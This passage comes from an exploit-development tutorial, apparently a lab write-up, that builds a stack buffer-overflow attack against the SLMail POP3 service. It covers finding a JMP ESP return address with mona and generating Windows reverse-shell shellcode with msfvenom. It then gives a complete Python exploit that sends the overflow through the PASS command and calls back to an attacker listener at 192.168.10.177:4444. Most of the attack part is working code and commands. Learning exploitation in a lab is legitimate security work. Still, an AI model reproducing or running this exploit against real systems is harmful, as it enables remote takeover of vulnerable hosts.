Run the script again and after the Immunity Debugger crashes typed at the bottom of Immunity Debugger in the command field the command `!mona modules` to open the modules.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHkvG0gdSYPS8LGlb2%2FWindows%207-2021-01-05-15-36-32.png?alt=media&token=995e42a0-679d-4bb0-99b5-05219d14f7bc)

!mona modules

We need to pickup a module that meets the following criteria:

-   The module we are looking for must have the ASLR and DEP field set to false.
    
-   The memory range of the module itself does not contain the bad characters `0x00,0xa0,0xd0`
    
The only one that matches this description is SLMFC.DLL. Now, we need to find an occuring "JMP ESP" or equivalent instruction within this DLL and locate which is the address of the instruction. First, we will search for the opcode equivalent of the "JMP ESP" instruction using the _nasm\_shell._ This will convert assembly language into hex code. The hex-code equivalent of the assembly instruction "JMP ESP" is FFE4.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHoHJ7iFXgBlL01K7T%2Fimage.png?alt=media&token=eab7240e-7445-4e38-a085-43a2a7e7e009)

We will use this information with mona in our Immunity Debugger. Type in the command field of the Immunity Debugger the command: `!mona find -s "\xff\xe4" -m slmfc.dll`

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHw6D0NQXRE6fTDM_g%2FWindows%207-2021-01-05-16-25-26.png?alt=media&token=5df7ceba-5769-4739-8ef1-503d5a7b699d)


From the result we are looking for a return address. I chose the first one 0x5f4a358f. Press the following button in the Immunity Debugger:

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHt9UhryyJ7ewWwDkg%2Fimage.png?alt=media&token=5f99e8ea-0899-45ff-ab6a-6d6a2cde0e6b)

and enter the address: 0x5f4a358f

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHtP4k-sx9TKPXt7bg%2Fimage.png?alt=media&token=90cdbada-45ee-484e-9fc1-5d4f7f34658e)

The Immunity Debugger confirms that there is a "JMP ESP" instruction to that address.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHsxJJD5ROgkPHyE4e%2Fimage.png?alt=media&token=7503a24d-65c4-4994-91b2-a74a091eb6fb)

If we redirect the EIP to this address at the time of the crash a "JMP ESP" instruction will be executed which then will lead the execution flow into our shellcode.

I chose the first one and edit my script as below:

```python 
#!/usr/bin/python

import sys, socket

shellcode = "A" * 2606 + "\x8f\x35\x4a\x5f"

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + shellcode + '\r\n')

except:

 print "Error Connecting to server"

```

The address is in Little Edian form. (Reverse order). Setting a break point in the Immunity Debugger (press "F2") at the "JMP ESP" instruction and running the script we see that the EIP is overwritten with the address we have set.

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHcrw_LTmw_fCLGzL0%2F-MQHytMH_S_JJKuXWIlM%2FScreenshot%20from%202021-01-05%2016-37-26.png?alt=media&token=777aebd8-9c4b-4287-9a8b-7ef187aba0e6)

Next step is to generate shellcode and gain root.

### Part 7: Generating Shellcode and Gaining Root

Generation of shellcode using the below command:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.177 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\xa0\xd0"
```

-p: payload
EXITFUNC=thread: makes the exploit a little more stable
-f: filetype
-a: architecture
-b: bad characters

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHyw9QcRYppYFKEohp%2F-MQIUCGNdU5vLgxZFo4k%2Fimage.png?alt=media&token=2ef36183-50f8-4cae-b2fd-5c87b65e441a)

Adding the payload to our script:

```python 
#!/usr/bin/python

import sys, socket

buff = ("\xbb\x78\xf0\xb8\x27\xd9\xe8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\x22\xfe\x5a\xd2\x2e\x16\x18"
"\x1d\xce\xe7\x7d\x97\x2b\xd6\xbd\xc3\x38\x49\x0e\x87\x6c\x66"
"\xe5\xc5\x84\xfd\x8b\xc1\xab\xb6\x26\x34\x82\x47\x1a\x04\x85"
"\xcb\x61\x59\x65\xf5\xa9\xac\x64\x32\xd7\x5d\x34\xeb\x93\xf0"
"\xa8\x98\xee\xc8\x43\xd2\xff\x48\xb0\xa3\xfe\x79\x67\xbf\x58"
"\x5a\x86\x6c\xd1\xd3\x90\x71\xdc\xaa\x2b\x41\xaa\x2c\xfd\x9b"
"\x53\x82\xc0\x13\xa6\xda\x05\x93\x59\xa9\x7f\xe7\xe4\xaa\x44"
"\x95\x32\x3e\x5e\x3d\xb0\x98\xba\xbf\x15\x7e\x49\xb3\xd2\xf4"
"\x15\xd0\xe5\xd9\x2e\xec\x6e\xdc\xe0\x64\x34\xfb\x24\x2c\xee"
"\x62\x7d\x88\x41\x9a\x9d\x73\x3d\x3e\xd6\x9e\x2a\x33\xb5\xf6"
"\x9f\x7e\x45\x07\x88\x09\x36\x35\x17\xa2\xd0\x75\xd0\x6c\x27"
"\x79\xcb\xc9\xb7\x84\xf4\x29\x9e\x42\xa0\x79\x88\x63\xc9\x11"
"\x48\x8b\x1c\xb5\x18\x23\xcf\x76\xc8\x83\xbf\x1e\x02\x0c\x9f"
"\x3f\x2d\xc6\x88\xaa\xd4\x81\x76\x82\xdc\x58\x1f\xd1\xe0\x4b"
"\x83\x5c\x06\x01\x2b\x09\x91\xbe\xd2\x10\x69\x5e\x1a\x8f\x14"
"\x60\x90\x3c\xe9\x2f\x51\x48\xf9\xd8\x91\x07\xa3\x4f\xad\xbd"
"\xcb\x0c\x3c\x5a\x0b\x5a\x5d\xf5\x5c\x0b\x93\x0c\x08\xa1\x8a"
"\xa6\x2e\x38\x4a\x80\xea\xe7\xaf\x0f\xf3\x6a\x8b\x2b\xe3\xb2"
"\x14\x70\x57\x6b\x43\x2e\x01\xcd\x3d\x80\xfb\x87\x92\x4a\x6b"
"\x51\xd9\x4c\xed\x5e\x34\x3b\x11\xee\xe1\x7a\x2e\xdf\x65\x8b"
"\x57\x3d\x16\x74\x82\x85\x26\x3f\x8e\xac\xae\xe6\x5b\xed\xb2"
"\x18\xb6\x32\xcb\x9a\x32\xcb\x28\x82\x37\xce\x75\x04\xa4\xa2"
"\xe6\xe1\xca\x11\x06\x20")

shellcode = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + buff

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.10.178',110))
 data = s.recv(1024)
 s.send('USER username' +'\r\n')
 data = s.recv(1024)
 s.send('PASS ' + shellcode + '\r\n')

except:

 print "Error Connecting to server"
```

The `"\x90" * 8` are the NOPS. NOPS are padding meaning no-operation. We add a padding between the JMP command and the buff to be safe that nothing will be truncated.

Open up a listener to your machine:

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHyw9QcRYppYFKEohp%2F-MQIV7PY1EMbHq5LEm2w%2Fimage.png?alt=media&token=28ad7e8c-4cd1-4c82-b76a-31274bb0407e)

Run the script and get a shell

![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHyw9QcRYppYFKEohp%2F-MQIVC2mc38R307yrXMz%2Fimage.png?alt=media&token=991865b1-1dd8-4872-8102-905e81111f41)

All scripts can be found [here](https://github.com/c00ki3-st/SLmail-Bof)
